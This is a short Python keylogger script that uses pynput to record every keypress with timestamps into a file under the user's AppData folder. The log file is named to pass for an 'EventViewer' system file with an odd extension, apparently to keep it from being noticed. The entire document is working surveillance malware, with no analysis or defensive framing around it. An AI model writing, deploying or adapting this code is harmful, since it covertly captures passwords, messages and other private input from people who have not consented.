from pynput.keyboard import Key, Listener
import logging
from os import path
from datetime import datetime
logging.basicConfig(filename=(path.expanduser("~")+"\\AppData\\Local\\EventViewer" + str(datetime.today().strftime("%d")) + ".xpb"), level=logging.DEBUG, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")
def test(k):
    logging.info(str(k))
with Listener(on_press=test) as abc:
    abc.join()